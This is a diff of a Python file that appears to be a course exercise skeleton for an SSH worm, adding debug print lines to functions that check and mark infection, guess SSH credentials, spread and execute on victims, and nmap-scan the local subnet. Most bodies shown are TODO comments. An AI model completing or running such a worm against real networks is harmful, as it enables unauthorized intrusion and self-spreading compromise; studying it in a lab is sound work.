@@ -38,6 +38,7 @@ INFECTED_MARKER_FILE = "/tmp/infected.txt"
 
 # TODO(): ADD CODE TO CHECK IF IT'S INFECTED
 def isInfectedSystem():
+	print("def isInfectedSystem():")
 	# Check if the system as infected. One
 	# approach is to check for a file called
 	# infected.txt in directory /tmp (which
@@ -64,7 +65,7 @@ def isInfectedSystem():
 # TODO(): ASSUMING THIS USES isInfectedSystem(), mark the system as infected, so it relies
 # on the previous function to work 
 def markInfected():
-	
+	print("def markInfected():")
 	# Mark the system as infected. One way to do
 	# this is to create a file called infected.txt
 	# in directory /tmp/
@@ -87,7 +88,7 @@ def markInfected():
 # to the victim system
 ###############################################################
 def spreadAndExecute(sshClient):
-	
+	print("def spreadAndExecute(sshClient):")
 	# This function takes as a parameter 
 	# an instance of the SSH class which
 	# was properly initialized and connected
@@ -123,6 +124,7 @@ def spreadAndExecute(sshClient):
 # 3 = probably the server is down or is not running SSH
 ###########################################################
 def tryCredentials(host, userName, password, sshClient):
+	print("def tryCredentials(host, userName, password, sshClient):")
 	
 	# Tries to connect to host host using
 	# the username stored in variable userName
@@ -169,7 +171,7 @@ def tryCredentials(host, userName, password, sshClient):
 # If the attack failed, returns a NULL
 ###############################################################
 def attackSystem(host):
-	
+	print("def attackSystem(host):")
 	# The credential list
 	global credList
 	
@@ -214,7 +216,7 @@ def attackSystem(host):
 # @return - The IP address of the current system
 ####################################################
 def getMyIP(interface):
-	
+	print("def getMyIP(interface)")
 	# TODO: Change this to retrieve and
 	# return the IP of the current system.
 	
@@ -242,14 +244,14 @@ def getMyIP(interface):
 # @return - a list of IP addresses on the same network
 #######################################################
 def getHostsOnTheSameNetwork():
-	
+	print("def getHostsOnTheSameNetwork():")
 	# TODO: Add code for scanning
 	# for hosts on the same network
 	# and return the list of discovered
 	# IP addresses.
 	nmScan = nmap.PortScanner()
 
-	nmScan.scan('10.0.0.0/24', arguments='-p 22--open')
+	nmScan.scan('10.0.0.0/24', arguments='--open')
 	# kevin
 	hostInfo = nmScan.all_hosts()
 	liveHosts = []
